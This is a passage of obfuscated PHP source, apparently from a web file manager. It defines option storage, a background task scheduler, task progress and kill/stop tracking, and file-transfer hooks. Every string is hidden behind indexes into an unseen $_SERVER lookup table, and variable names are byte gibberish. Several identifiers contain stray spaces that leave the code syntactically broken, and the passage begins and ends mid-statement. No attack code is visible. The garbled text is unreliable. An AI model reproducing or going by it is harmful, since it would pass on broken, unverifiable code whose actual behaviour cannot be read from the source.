$´·ş‹™ = 0; $˜¥¨ŸÜ´ = $­£ë„ü¢[$”òá˜©[270]][$ö¨ªêû][1]; $˜¥¨ŸÜ´ = is_array($˜¥¨ŸÜ´) ? $˜¥¨ŸÜ´ : array(); for ($Ù”ˆú£ = 0; $Ù”ˆú£ < count($˜¥¨ŸÜ´); $Ù”ˆú£ += $ˆŞõ’ë‚) { $“í¬ŸÁ† = array_slice($˜¥¨ŸÜ´, $Ù”ˆú£, $ˆŞõ’ë‚); if (!is_array($“í¬ŸÁ†) || count($“í¬ŸÁ†) == 0) { break; } $­£ë„ü¢[$”òá˜©[270]][$ö¨ªêû][1] = $“í¬ŸÁ†; $this->optionsValue($­£ë„ü¢); $´·ş‹™ += parent::delete($Ó»€è×è); } return $´·ş‹™; } private function findWhereField($Öí»ç¼º) { $ºØóÌ¿ñ =& $_SERVER[® ¨Ä®ñ]; $š¶ò¬˜‹ = self::SQL_WHERE_IN_CHUNK; if (!is_array($Öí»ç¼º) || !is_array($Öí»ç¼º[$ºØóÌ¿ñ[270]])) { return !1; } foreach ($Öí»ç¼º[$ºØóÌ¿ñ[270]] as $Ï£³Ìş‘ => $ÌÙ†Íˆ) { if (is_array($ÌÙ†Íˆ) && isset($ÌÙ†Íˆ[0]) && is_string($ÌÙ†Íˆ[0]) && strtolower($ÌÙ†Íˆ[0]) == $ºØóÌ¿ñ[7] && is_array($ÌÙ†Íˆ[1]) && count($ÌÙ†Íˆ[1]) > $š¶ò¬˜‹) { ignore_timeout(); return $Ï£³Ìş‘; } } return !1; } public function setMasterDB($ş»éˆó = true) { think_config($_SERVER[® ¨Ä®ñ][388], $ş»éˆó); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\x79\x73\x74\x65\x6d\x4f\160\x74\x69\x6f\156"; public $field = array(); public function listData($Ä•Œ”â = false, $…£û³¬ = "\x6d\157\x64\151\146\171\124\151\155\x65", $ñå¿Òï = false) { $€ì‚ÎË„ = Model($this->modelType)->get(!1, $this->optionType, !0); $³âã´¦ú = array_values($€ì‚ÎË„); if ($³âã´¦ú && $³âã´¦ú[0] && !is_array($³âã´¦ú[0])) { Model($this->modelType)->cacheRemove($this->optionType); $€ì‚ÎË„ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$€ì‚ÎË„) { return $Ä•Œ”â ? null : array(); } if (!$Ä•Œ”â) { $€ì‚ÎË„ = array_filter(array_values($€ì‚ÎË„)); return array_sort_by($€ì‚ÎË„, $…£û³¬, $ñå¿Òï); } return $€ì‚ÎË„[$_SERVER[® ¨Ä®ñ][389] . $Ä•Œ”â]; } public function insert($Ê·Í˜™œ) { $ÖØ¿¬¹ô =& $_SERVER[® ¨Ä®ñ]; $Ê·Í˜™œ = array_field_key($Ê·Í˜™œ, $this->field); $Şœ³®³ = Model($this->modelType)->get($ÖØ¿¬¹ô[390], $this->optionType . $ÖØ¿¬¹ô[391]); $Şœ³®³ = $Şœ³®³ ? $Şœ³®³ : 0; $Ê·Í˜™œ[$ÖØ¿¬¹ô[392]] = ++$Şœ³®³; $Ê·Í˜™œ[$ÖØ¿¬¹ô[193]] = time(); $Ê·Í˜™œ[$ÖØ¿¬¹ô[86]] = time(); Model($this->modelType)->set($ÖØ¿¬¹ô[390], $Şœ³®³, $this->optionType . $ÖØ¿¬¹ô[391]); Model($this->modelType)->set($ÖØ¿¬¹ô[389] . $Şœ³®³, $Ê·Í˜™œ, $this->optionType); return $Şœ³®³; } public function update($¸¨Ó‹¸¦, $•äÀŠÄ) { $ÁÌÃƒã£ =& $_SERVER[® ¨Ä®ñ]; $•äÀŠÄ = array_field_key($•äÀŠÄ, $this->field); $ÅØÒéÒ» = $this->listData($¸¨Ó‹¸¦); if (!$ÅØÒéÒ» || !$¸¨Ó‹¸¦) { return !1; } $•äÀŠÄ = array_merge($ÅØÒéÒ», $•äÀŠÄ); $•äÀŠÄ[$ÁÌÃƒã£[86]] = time(); return Model($this->modelType)->set($ÁÌÃƒã£[389] . $¸¨Ó‹¸¦, $•äÀŠÄ, $this->optionType); } public function remove($ÒÊÕœÑ) { if (!$ÒÊÕœÑ) { return !1; } return Model($this->modelType)->remove($_SERVER[® ¨Ä®ñ][389] . $ÒÊÕœÑ, $this->optionType); } public function clear() { $íÇ“ï‰Ì =& $_SERVER[® ¨Ä®ñ]; Model($this->modelType)->remove($íÇ“ï‰Ì[390], $this->optionType . $íÇ“ï‰Ì[391]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($†€—ïˆÏ, $ıİ­ìÖ˜) { if (!$ıİ­ìÖ˜) { return !1; } $¥‹Ë»Ô„ = $this->listData(); $¥‹Ë»Ô„ = array_to_keyvalue($¥‹Ë»Ô„, $†€—ïˆÏ); return isset($¥‹Ë»Ô„[$ıİ­ìÖ˜]) ? $¥‹Ë»Ô„[$ıİ­ìÖ˜] : !1; } public function findByName($ÕÅß¤«) { return $this->findByKey($_SERVER[® ¨Ä®ñ][32], $ÕÅß¤«); } protected function resetData($ÚáÂ†’ä) { $Ñæ’„¼„ =& $_SERVER[® ¨Ä®ñ]; $ÚáÂ†’ä = is_array($ÚáÂ†’ä) ? $ÚáÂ†’ä : array(); $øë Ì³Í = array(); for ($çÁ”„¾‘ = 0; $çÁ”„¾‘ < count($ÚáÂ†’ä); $çÁ”„¾‘++) { $øë Ì³Í[$Ñæ’„¼„[389] . $ÚáÂ†’ä[$çÁ”„¾‘][$Ñæ’„¼„[392]]] = $ÚáÂ†’ä[$çÁ”„¾‘]; } return Model($this->modelType)->set($øë Ì³Í, !1, $this->optionType); } private function getAutoName($ÙÁ„”£Ş) { $§£••Ş‘ = array_to_keyvalue($this->listData(), $_SERVER[® ¨Ä®ñ][32]); if (!$§£••Ş‘ || !isset($§£••Ş‘[$ÙÁ„”£Ş])) { return $ÙÁ„”£Ş; } for ($ç¸‹Ô©è = 1; $ç¸‹Ô©è < count($§£••Ş‘); $ç¸‹Ô©è++) { $ş»ì‹Òù = $ÙÁ„”£Ş . "\x28{$ç¸‹Ô©è}\x29"; if (!isset($§£••Ş‘[$ş»ì‹Òù])) { return $ş»ì‹Òù; } } return $ş»ì‹Òù; } } goto c¿‘¿Ô¿íŸ; AˆäÍñŸ¾Â: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Ã—­ñı =& $_SERVER[® ¨Ä®ñ]; if (self::valueGet($Ã—­ñı[732]) != $Ã—­ñı[89]) { return; } if (self::valueGet($Ã—­ñı[1599]) == $Ã—­ñı[89]) { $¤Öæğ‹™ = self::valueGet($Ã—­ñı[1600]); if (time() - $¤Öæğ‹™ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); self::valueSet($Ã—­ñı[1599], $Ã—­ñı[89]); self::log($Ã—­ñı[1601]); Hook::bind($Ã—­ñı[1602], $Ã—­ñı[1603]); $óÌÜ°®ò = 0; while (!0) { self::cacheClear(); if (self::valueGet($Ã—­ñı[732]) != $Ã—­ñı[89]) { self::valueSet($Ã—­ñı[1599], $Ã—­ñı[190]); self::log($Ã—­ñı[1604]); die; } $‡Œ¥Ü” = time(); if ($‡Œ¥Ü” - $óÌÜ°®ò >= 60) { self::valueSet(array($Ã—­ñı[1599] => $Ã—­ñı[89], $Ã—­ñı[1600] => $‡Œ¥Ü”), !1); $óÌÜ°®ò = $‡Œ¥Ü”; } if (!file_exists(USER_SYSTEM . $Ã—­ñı[1605])) { self::valueSet(array($Ã—­ñı[1599] => $Ã—­ñı[190], $Ã—­ñı[732] => $Ã—­ñı[190]), !1); self::log($Ã—­ñı[1606]); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ÂÕÅ¸”Ü =& $_SERVER[® ¨Ä®ñ]; http_close(); self::valueSet($ÂÕÅ¸”Ü[732], $ÂÕÅ¸”Ü[190]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÂÕÅ¸”Ü[1599] => $ÂÕÅ¸”Ü[190], $ÂÕÅ¸”Ü[732] => $ÂÕÅ¸”Ü[89]), !1); } public static function shutdownEvent() { $»—×ùâÒ =& $_SERVER[® ¨Ä®ñ]; self::valueSet($»—×ùâÒ[1599], $»—×ùâÒ[190]); self::log($»—×ùâÒ[1607]); } public static function config($›Õ±ûÍÌ, $ĞÆ’Ÿè™) { self::valueSet($_SERVER[® ¨Ä®ñ][732], $›Õ±ûÍÌ); } private static function taskRunAll() { $ä®û·İ¿ =& $_SERVER[® ¨Ä®ñ]; $ûáíÅº¢ = timeFloat(); $õã€–À“ = Model($ä®û·İ¿[1608])->listData(); $à¸Æºâ¹ = count($õã€–À“); for ($³½ŠŠ¸Ç = 0; $³½ŠŠ¸Ç < $à¸Æºâ¹; $³½ŠŠ¸Ç++) { $º£¡×ùŠ = $õã€–À“[$³½ŠŠ¸Ç]; if (!$º£¡×ùŠ[$ä®û·İ¿[392]] || $º£¡×ùŠ[$ä®û·İ¿[1609]] != $ä®û·İ¿[89]) { continue; } if (!self::taskTimeCheck($º£¡×ùŠ)) { continue; } self::taskRun($º£¡×ùŠ); } Hook::trigger($ä®û·İ¿[1610]); self::taskQueueRun($ûáíÅº¢); } private static function taskQueueRun($–„÷É˜¡) { $µ ¿‹ĞÎ = 10; while (!0) { $Î¡×ëÀ† = TaskQueue::run(); if ($Î¡×ëÀ† === !1) { break; } if (timeFloat() - $–„÷É˜¡ >= $µ ¿‹ĞÎ) { break; } } } private static function taskTimeCheck($·à»ƒ¸Æ) { $ŠÇ·Ù¾Ü =& $_SERVER[® ¨Ä®ñ]; $Í•Àé•÷ = json_decode($·à»ƒ¸Æ[$ŠÇ·Ù¾Ü[196]], !0); $ÓÒ®‰“ù = intval($·à»ƒ¸Æ[$ŠÇ·Ù¾Ü[1600]]); $Ğ“áıá = strtotime($ŠÇ·Ù¾Ü[1611] . $Í•Àé•÷[$ŠÇ·Ù¾Ü[1612]] . $ŠÇ·Ù¾Ü[1613]) - strtotime($ŠÇ·Ù¾Ü[1614]); $ìâÒ‰ÕÊ = time() - strtotime(date($ŠÇ·Ù¾Ü[1615]) . $ŠÇ·Ù¾Ü[1616]); $—Èİ¦¥ = $ìâÒ‰ÕÊ >= $Ğ“áıá && $ìâÒ‰ÕÊ <= $Ğ“áıá + 3600; switch ($Í•Àé•÷[$ŠÇ·Ù¾Ü[33]]) { case $ŠÇ·Ù¾Ü[1617]: if (time() - $ÓÒ®‰“ù < 3600 * 24 * 30) { return !1; } if ($Í•Àé•÷[$ŠÇ·Ù¾Ü[1617]] == date($ŠÇ·Ù¾Ü[1618]) && $—Èİ¦¥) { return !0; } break; case $ŠÇ·Ù¾Ü[1619]: if (time() - $ÓÒ®‰“ù < 3600 * 24 * 7) { return !1; } $«³¬¾©¼ = date($ŠÇ·Ù¾Ü[1620]) == 0 ? 7 : date($ŠÇ·Ù¾Ü[1620]); if ($Í•Àé•÷[$ŠÇ·Ù¾Ü[1619]] == $«³¬¾©¼ && $—Èİ¦¥) { return !0; } break; case $ŠÇ·Ù¾Ü[1612]: if (time() - $ÓÒ®‰“ù < 3600 * 24) { return !1; } if ($—Èİ¦¥) { return !0; } break; case $ŠÇ·Ù¾Ü[1621]: if (time() - $ÓÒ®‰“ù >= floatval($Í•Àé•÷[$ŠÇ·Ù¾Ü[1621]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $˜·Ôš’Ÿ =& $_SERVER[® ¨Ä®ñ]; static $”©ò åÏ = 0; $¡„ßğÚ = 300; if (!$”©ò åÏ) { $”©ò åÏ = time(); } if (time() - $”©ò åÏ < $¡„ßğÚ) { return; } $”©ò åÏ = time(); $ØÀ¼Ø¹µ = Model($˜·Ôš’Ÿ[504])->db($˜·Ôš’Ÿ[12]); if ($ØÀ¼Ø¹µ) { $ØÀ¼Ø¹µ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($˜·Ôš’Ÿ[1622], $˜·Ôš’Ÿ[1623]); die; } } public static function taskRun($Ì°Ğñº¡) { $–ÑËÎª“ =& $_SERVER[® ¨Ä®ñ]; self::log($–ÑËÎª“[1624] . $Ì°Ğñº¡[$–ÑËÎª“[392]] . $–ÑËÎª“[1625] . $Ì°Ğñº¡[$–ÑËÎª“[32]] . $–ÑËÎª“[1626] . $Ì°Ğñº¡[$–ÑËÎª“[1627]]); Model($–ÑËÎª“[1608])->run($Ì°Ğñº¡[$–ÑËÎª“[392]]); $é¬¨³‘Æ = timeFloat(); $ÌïËÙ÷¾ = $–ÑËÎª“[12]; switch ($Ì°Ğñº¡[$–ÑËÎª“[33]]) { case $–ÑËÎª“[302]: $êªÂ‹ğ™ = url_request($Ì°Ğñº¡[$–ÑËÎª“[1627]], $–ÑËÎª“[225], !1, !1, !1, !1, 10); if ($êªÂ‹ğ™[$–ÑËÎª“[732]]) { $ÌïËÙ÷¾ = strlen($êªÂ‹ğ™[$–ÑËÎª“[1175]]); } break; case $–ÑËÎª“[224]: $ÌïËÙ÷¾ = Hook::apply($Ì°Ğñº¡[$–ÑËÎª“[1627]]); default: break; } Model($–ÑËÎª“[1628])->add(array($–ÑËÎª“[1629] => $–ÑËÎª“[12], $–ÑËÎª“[1630] => $–ÑËÎª“[190], $–ÑËÎª“[33] => $–ÑËÎª“[1631] . $Ì°Ğñº¡[$–ÑËÎª“[392]], $–ÑËÎª“[1632] => json_encode(array($–ÑËÎª“[32] => $Ì°Ğñº¡[$–ÑËÎª“[32]], $–ÑËÎª“[1633] => timeFloat() - $é¬¨³‘Æ, $–ÑËÎª“[288] => $ÌïËÙ÷¾)))); $ï¿ø¡ñü = $ÌïËÙ÷¾ ? $–ÑËÎª“[1634] . $ÌïËÙ÷¾ : $–ÑËÎª“[12]; self::log($–ÑËÎª“[1635] . $Ì°Ğñº¡[$–ÑËÎª“[392]] . $–ÑËÎª“[527] . $ï¿ø¡ñü); return !0; } private static function valueGet($İõ£Œ‡İ) { $ˆúúºŒ¤ =& $_SERVER[® ¨Ä®ñ]; $ú¨Ğ›êË = $ˆúúºŒ¤[1636]; $¡øÒë¨Ğ = Model($ˆúúºŒ¤[424])->get($İõ£Œ‡İ, $ú¨Ğ›êË); if (is_null($¡øÒë¨Ğ)) { Model($ˆúúºŒ¤[424])->set($ˆúúºŒ¤[732], $ˆúúºŒ¤[89], $ú¨Ğ›êË); Model($ˆúúºŒ¤[424])->set($ˆúúºŒ¤[1599], $ˆúúºŒ¤[190], $ú¨Ğ›êË); $¡øÒë¨Ğ = Model($ˆúúºŒ¤[424])->get($İõ£Œ‡İ, $ú¨Ğ›êË); } return $¡øÒë¨Ğ; } private static function valueSet($ï±’äª, $ùè«×”ï) { $€†ˆé„ä =& $_SERVER[® ¨Ä®ñ]; $çîóÒê = $€†ˆé„ä[1637]; CacheLock::lock($çîóÒê); $‹İµ¼Òï = Model($€†ˆé„ä[424])->set($ï±’äª, $ùè«×”ï, $€†ˆé„ä[1636]); CacheLock::unlock($çîóÒê); return $‹İµ¼Òï; } protected static function log($ôÇ‹­…) { write_log($ôÇ‹­…, $_SERVER[® ¨Ä®ñ][1623]); } private static function cacheClear() { $ÚÀèëù =& $_SERVER[® ¨Ä®ñ]; Cache::clearMemory(Model($ÚÀèëù[424])->cacheKey($ÚÀèëù[1636])); Cache::clearMemory(Model($ÚÀèëù[424])->cacheKey($ÚÀèëù[1638])); Model($ÚÀèëù[1608])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\162\165\156\156\x69\x6e\147"; const STATYS_KILL = "\153\151\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($²şÛ·™, $‚öü¥Áß = '', $‰ûç´Û… = 0, $íò’å“Ù = '') { $†İœªëø =& $_SERVER[® ¨Ä®ñ]; if (self::get($²şÛ·™)) { return; } $this->task = array($†İœªëø[392] => $²şÛ·™, $†İœªëø[1639] => USER_ID, $†İœªëø[1539] => $íò’å“Ù, $†İœªëø[33] => $‚öü¥Áß, $†İœªëø[1048] => $†İœªëø[12], $†İœªëø[768] => $‰ûç´Û…, $†İœªëø[1640] => 0, $†İœªëø[1641] => 0, $†İœªëø[1642] => 0, $†İœªëø[1643] => timeFloat(), $†İœªëø[1644] => 0, $†İœªëø[1645] => 0, $†İœªëø[1646] => 0, $†İœªëø[1647] => 0, $†İœªëø[732] => $†İœªëø[1599]); $GLOBALS[$†İœªëø[1648]] = 1; Hook::bind($†İœªëø[1602], array($this, $†İœªëø[1649])); Hook::bind($†İœªëø[1650], array($this, $†İœªëø[1651])); $this->startAfter(); Hook::trigger($†İœªëø[1652], $this->task); $this->task[$†İœªëø[1645]] = timeFloat(); } public function end() { $úøîêÂ =& $_SERVER[® ¨Ä®ñ]; if (!$this->task) { return; } if ($this->task[$úøîêÂ[1645]]) { self::valueSet($this->task[$úøîêÂ[392]], !1); } $ú¿ãºî = timeFloat() - $this->task[$úøîêÂ[1643]]; self::log($úøîêÂ[1653] . $this->task[$úøîêÂ[392]] . $úøîêÂ[1654] . $ú¿ãºî . $úøîêÂ[1655]); Hook::unbind($úøîêÂ[1602], array($this, $úøîêÂ[1649])); Hook::unbind($úøîêÂ[1650], array($this, $úøîêÂ[1651])); $this->endAfter(); $this->task = !1; } public function update($ŸØÄƒİô = 0, $™ü¡ü¥£ = false) { $£™öÈö =& $_SERVER[® ¨Ä®ñ]; $¦¶À†Î =& $this->task; if (!$¦¶À†Î) { return; } $¦¶À†Î[$£™öÈö[1640]] += $ŸØÄƒİô; $¦¶À†Î[$£™öÈö[1644]] = timeFloat(); if ($¦¶À†Î[$£™öÈö[768]]) { if ($¦¶À†Î[$£™öÈö[768]] < $¦¶À†Î[$£™öÈö[1640]]) { $¦¶À†Î[$£™öÈö[768]] = $¦¶À†Î[$£™öÈö[1640]]; } $«•ºĞÜŞ = timeFloat() - $¦¶À†Î[$£™öÈö[1643]] - $¦¶À†Î[$£™öÈö[1646]]; $¦¶À†Î[$£™öÈö[1641]] = $¦¶À†Î[$£™öÈö[1640]] / $¦¶À†Î[$£™öÈö[768]]; $¦¶À†Î[$£™öÈö[1642]] = $¦¶À†Î[$£™öÈö[1640]] / $«•ºĞÜŞ; if ($¦¶À†Î[$£™öÈö[1641]] > 0) { $¦¶À†Î[$£™öÈö[1647]] = $«•ºĞÜŞ * (1 - $¦¶À†Î[$£™öÈö[1641]]) / $¦¶À†Î[$£™öÈö[1641]]; } $¦¶À†Î[$£™öÈö[1647]] = $¦¶À†Î[$£™öÈö[1647]] <= 0 ? 0 : $¦¶À†Î[$£™öÈö[1647]]; } $this->updateAfter(); $îç¼’×Ç = 0.2; if (timeFloat() - $¦¶À†Î[$£™öÈö[1645]] < $îç¼’×Ç && !$™ü¡ü¥£) { return; } $¡¡¹™œÈ = self::get($¦¶À†Î[$£™öÈö[392]]); $‹œÓ¦éÉ = $¡¡¹™œÈ[$£™öÈö[732]]; if ($‹œÓ¦éÉ == self::STATYS_KILL) { $Ï†ı¸¶Ë = array($£™öÈö[1656] => LNG($£™öÈö[1657]), $£™öÈö[1173] => !1); Cache::set($£™öÈö[1658] . $this->task[$£™öÈö[392]], $Ï†ı¸¶Ë, 30); $this->onKill(); $this->end(); die; } else { if ($‹œÓ¦éÉ == self::STATYS_STOP) { $ª—Ó¢Üü = 2; $¡¡¹™œÈ[$£™öÈö[1646]] += $ª—Ó¢Üü; self::valueSet($¦¶À†Î[$£™öÈö[392]], $¡¡¹™œÈ); sleep($ª—Ó¢Üü); $this->update(); return; } } $¦¶À†Î[$£™öÈö[732]] = $‹œÓ¦éÉ ? $‹œÓ¦éÉ : $¦¶À†Î[$£™öÈö[732]]; $¦¶À†Î[$£™öÈö[1646]] = $¡¡¹™œÈ[$£™öÈö[1646]] ? $¡¡¹™œÈ[$£™öÈö[1646]] : 0; $¦¶À†Î[$£™öÈö[1645]] = timeFloat(); Hook::trigger($£™öÈö[1659], $¦¶À†Î); self::valueSet($¦¶À†Î[$£™öÈö[392]], $¦¶À†Î); } public function onKillSet($±§¶çÚë, $ÓŞ·¾– = array()) { $this->onKillCall = array($±§¶çÚë, $ÓŞ·¾–); } public function onKill() { $Òõ«Àêì =& $_SERVER[® ¨Ä®ñ]; self::log($Òõ«Àêì[1653] . $this->task[$Òõ«Àêì[392]] . $Òõ«Àêì[1660]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ıß÷ì‹á) { $ñ×ûÕçŸ =& $_SERVER[® ¨Ä®ñ]; Cache::set($ñ×ûÕçŸ[1658] . $this->task[$ñ×ûÕçŸ[392]], $ıß÷ì‹á, 60); return $ıß÷ì‹á; } public static function get($Áø¡¼Óİ) { $²¢áÀ°™ =& $_SERVER[® ¨Ä®ñ]; $†Ëà÷š” = self::valueGet($Áø¡¼Óİ); if (is_array($†Ëà÷š”) && $†Ëà÷š”[$²¢áÀ°™[1661]]) { $ç¢İ®–Î = ActionApply($†Ëà÷š”[$²¢áÀ°™[1661]], array($†Ëà÷š”)); $†Ëà÷š” = is_array($ç¢İ®–Î) ? $ç¢İ®–Î : $†Ëà÷š”; } return $†Ëà÷š”; } public static function listData() { $œ˜²ÔÌ = self::valueGet(); return array_sort_by($œ˜²ÔÌ, $_SERVER[® ¨Ä®ñ][1643], !0); } public static function kill($‹î­Ò‚) { return self::changeStatus($‹î­Ò‚, self::STATYS_KILL); } public static function stop($•Æş™ŸÓ) { return self::changeStatus($•Æş™ŸÓ, self::STATYS_STOP); } public static function restart($×ü²¿õ) { return self::changeStatus($×ü²¿õ, self::STATYS_RUNNING); } public static function killAll() { $ÀŸÎè Š =& $_SERVER[® ¨Ä®ñ]; $ïĞş¢ÌÄ = self::listData(); foreach ($ïĞş¢ÌÄ as $û¯±Ñ“) { self::kill($û¯±Ñ“[$ÀŸÎè Š[392]]); } sleep(2); foreach ($ïĞş¢ÌÄ as $û¯±Ñ“) { self::valueSet($û¯±Ñ“[$ÀŸÎè Š[392]], !1); } } private static function changeStatus($Ÿ‹ÙÑ»¢, $‹­´Öãû) { $Ç—‰•¢° =& $_SERVER[® ¨Ä®ñ]; $µöà‘—ö = self::valueGet($Ÿ‹ÙÑ»¢); if (!$µöà‘—ö) { return !1; } $µöà‘—ö[$Ç—‰•¢°[732]] = $‹­´Öãû; self::valueSet($Ÿ‹ÙÑ»¢, $µöà‘—ö); self::log($Ç—‰•¢°[1662] . $µöà‘—ö[$Ç—‰•¢°[392]] . $Ç—‰•¢°[1663] . $‹­´Öãû); return !0; } public static function valueGet($ŠÄ–ÃŠË = false) { $ş±Îüïı =& $_SERVER[® ¨Ä®ñ]; if ($ŠÄ–ÃŠË) { $¶¯÷ëõì = Model($ş±Îüïı[436])->where(array($ş±Îüïı[95] => $ŠÄ–ÃŠË, $ş±Îüïı[33] => $ş±Îüïı[1055]))->find(); return $¶¯÷ëõì ? json_decode($¶¯÷ëõì[$ş±Îüïı[369]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($„İäØÒú = false) { $ÁìĞèÛ› =& $_SERVER[® ¨Ä®ñ]; $ıœ”ø¶Í = array($ÁìĞèÛ›[33] => $ÁìĞèÛ›[1055]); if ($„İäØÒú) { $ıœ”ø¶Í[$ÁìĞèÛ›[1639]] = $„İäØÒú; } $à‰½ƒã— = Model($ÁìĞèÛ›[436])->where($ıœ”ø¶Í)->select(); $à‰½ƒã— = $à‰½ƒã— ? $à‰½ƒã— : array(); foreach ($à‰½ƒã— as $Ù‘ÉÈÏ => $Á²“ËÉÅ) { $à‰½ƒã—[$Ù‘ÉÈÏ] = json_decode($Á²“ËÉÅ[$ÁìĞèÛ›[369]], !0); } return $à‰½ƒã—; } public static function valueSet($î«Çıïˆ, $Ì Â‡½Œ) { $µçÛœ¸î =& $_SERVER[® ¨Ä®ñ]; if (!$Ì Â‡½Œ) { return Model($µçÛœ¸î[436])->where(array($µçÛœ¸î[95] => $î«Çıïˆ, $µçÛœ¸î[33] => $µçÛœ¸î[1055]))->delete(); } $ùó¶º˜ª = json_encode($Ì Â‡½Œ); if (!$ùó¶º˜ª) { ob_start(); var_dump($Ì Â‡½Œ); $àÁ¬Šì£ = ob_get_clean(); self::log($µçÛœ¸î[1664] . json_encode_force($àÁ¬Šì£)); } if (!$î«Çıïˆ || !$Ì Â‡½Œ[$µçÛœ¸î[392]]) { return !1; } $ºæ¼Àş’ = array($µçÛœ¸î[33] => $µçÛœ¸î[1055], $µçÛœ¸î[1639] => USER_ID, $µçÛœ¸î[95] => $î«Çıïˆ, $µçÛœ¸î[369] => $ùó¶º˜ª); $¹©Ÿ–êÕ = $µçÛœ¸î[1665]; CacheLock::lock($¹©Ÿ–êÕ); Model($µçÛœ¸î[436])->add($ºæ¼Àş’, array(), !0); CacheLock::unlock($¹©Ÿ–êÕ); } public static function log($ıÌÉ“ş) { if (!GLOBAL_DEBUG) { return; } write_log($ıÌÉ“ş, $_SERVER[® ¨Ä®ñ][1666]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ üñ›ü¦ =& $_SERVER[® ¨Ä®ñ]; $°Á»Á¡Í =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ üñ›ü¦[1667], array($this, $ üñ›ü¦[1668])); Hook::bind($ üñ›ü¦[1197], array($this, $ üñ›ü¦[1669])); Hook::bind($ üñ›ü¦[1670], array($this, $ üñ›ü¦[1671])); Hook::bind($ üñ›ü¦[589], array($this, $ üñ›ü¦[1672])); Hook::bind($ üñ›ü¦[590], array($this, $ üñ›ü¦[1673])); Hook::bind($ üñ›ü¦[592], array($this, $ üñ›ü¦[1674])); Hook::bind($ üñ›ü¦[593], array($this, $ üñ›ü¦[1674])); Hook::bind($ üñ›ü¦[559], array($this, $ üñ›ü¦[1675])); Hook::bind($ üñ›ü¦[556], array($this, $ üñ›ü¦[1675])); Hook::bind($ üñ›ü¦[561], array($this, $ üñ›ü¦[1675])); Hook::bind($ üñ›ü¦[563], array($this, $ üñ›ü¦[1675])); Hook::bind($ üñ›ü¦[565], array($this, $ üñ›ü¦[1675])); Hook::bind($ üñ›ü¦[1676], array($this, $ üñ›ü¦[1677])); Hook::bind($ üñ›ü¦[582], array($this, $ üñ›ü¦[1678])); $this->sourceModelCopyFlag = !1; Hook::bind($ üñ›ü¦[1679], array($this, $ üñ›ü¦[1680])); Hook::bind($ üñ›ü¦[1681], array($this, $ üñ›ü¦[1682])); Hook::bind($ üñ›ü¦[1683], array($this, $ üñ›ü¦[1684])); $°Á»Á¡Í[$ üñ›ü¦[1685]] = LNG($ üñ›ü¦[1686]); $°Á»Á¡Í[$ üñ›ü¦[1687]] = 0; $°Á»Á¡Í[$ üñ›ü¦[1688]] = 0; $°Á»Á¡Í[$ üñ›ü¦[1048]] = $ üñ›ü¦[12]; $°Á»Á¡Í[$ üñ›ü¦[1689]] = $ üñ›ü¦[12]; $°Á»Á¡Í[$ üñ›ü¦[1690]] = 0; $°Á»Á¡Í[$ üñ›ü¦[1691]] = 0; $°Á»Á¡Í[$ üñ›ü¦[1692]] = 0; if (!$°Á»Á¡Í[$ üñ›ü¦[1539]]) { $°Á»Á¡Í[$ üñ›ü¦[1539]] = LNG($ üñ›ü¦[1693]); } } protected function endAfter() { $”«°šŸÉ =& $_SERVER[® ¨Ä®ñ]; Hook::unbind($”«°šŸÉ[1667], array($this, $”«°šŸÉ[1668])); Hook::unbind($”«°šŸÉ[1197], array($this, $”«°šŸÉ[1669])); Hook::unbind($”«°šŸÉ[1670], array($this, $”«°šŸÉ[1671])); Hook::unbind($”«°šŸÉ[589], array($this, $”«°šŸÉ[1672])); Hook::unbind($”«°šŸÉ[590], array($this, $”«°šŸÉ[1673])); Hook::unbind($”«°šŸÉ[592], array($this, $”«°šŸÉ[1674])); Hook::unbind($”«°šŸÉ[593], array($this, $”«°šŸÉ[1674])); Hook::unbind($”«°šŸÉ[559], array($this, $”«°šŸÉ[1675])); Hook::unbind($”«°šŸÉ[556], array($this, $”«°šŸÉ[1675])); Hook::unbind($”«°šŸÉ[561], array($this, $”«°šŸÉ[1675])); Hook::unbind($”«°šŸÉ[563], array($this, $”«°šŸÉ[1675])); Hook::unbind($”«°šŸÉ[565], array($this, $”«°šŸÉ[1675])); Hook::unbind($”«°šŸÉ[1676], array($this, $”«°šŸÉ[1677])); Hook::unbind($”«°šŸÉ[582], array($this, $”«°šŸÉ[1678])); Hook::unbind($”«°šŸÉ[1679], array($this, $”«°šŸÉ[1680])); Hook::unbind($”«°šŸÉ[1681], array($this, $”«°šŸÉ[1682])); Hook::unbind($”«°šŸÉ[1683], array($this, $”«°šŸÉ[1684])); } public function copyMoveStart($™¬•–ä, $¨ÊÚóÚÁ, $‡¸‰œšÀ, $òªÃ°¥¿) { $Âè£‹ì =& $_SERVER[® ¨Ä®ñ]; self::log($Âè£‹ì[1694] . $¨ÊÚóÚÁ . $Âè£‹ì[70] . $òªÃ°¥¿); $”¼˜ˆëæ = rtrim(TEMP_FILES, $Âè£‹ì[8]); if (substr($¨ÊÚóÚÁ, 0, strlen($”¼˜ˆëæ)) == $”¼˜ˆëæ) { return; } if (substr($òªÃ°¥¿, 0, strlen($”¼˜ˆëæ)) == $”¼˜ˆëæ) { return; } $ÖÚáâ•Ñ =& $this->task; $ÖÚáâ•Ñ[$Âè£‹ì[1695]] = KodIO::transferType($™¬•–ä, $‡¸‰œšÀ); $this->update(); } public function updateAfter() { $„¥½¸‘¨ =& $_SERVER[® ¨Ä®ñ]; $É¯ú¸ªª =& $this->task; if (!$É¯ú¸ªª[$„¥½¸‘¨[745]]) { return; } if 